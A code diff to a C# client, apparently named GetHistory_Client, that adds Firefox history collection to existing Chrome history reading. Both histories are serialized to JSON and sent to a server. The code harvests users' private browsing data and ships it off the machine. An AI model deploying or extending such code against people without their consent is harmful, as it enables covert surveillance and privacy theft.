@@ -79,6 +79,12 @@ namespace GetHistory_Client
 
         public void GetAndSendHistoryToServ()
         {
+            string json = string.Empty;
+            Firefox firefox = new Firefox();
+            List<URL> firefoxlURL = new List<URL>();
+            firefoxlURL.AddRange(firefox.GetHistory());
+            json = JsonSerializer.Serialize<List<URL>>(firefoxlURL);
+            this.SengMsg(json);
             string chromeHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
             if (!File.Exists("History"))
             {
@@ -121,7 +127,7 @@ namespace GetHistory_Client
                 }
                
             }
-            string json = JsonSerializer.Serialize<List<HistoryItem>>(allHistoryItems);
+            json = JsonSerializer.Serialize<List<HistoryItem>>(allHistoryItems);
             this.SengMsg(json);
         }
     }
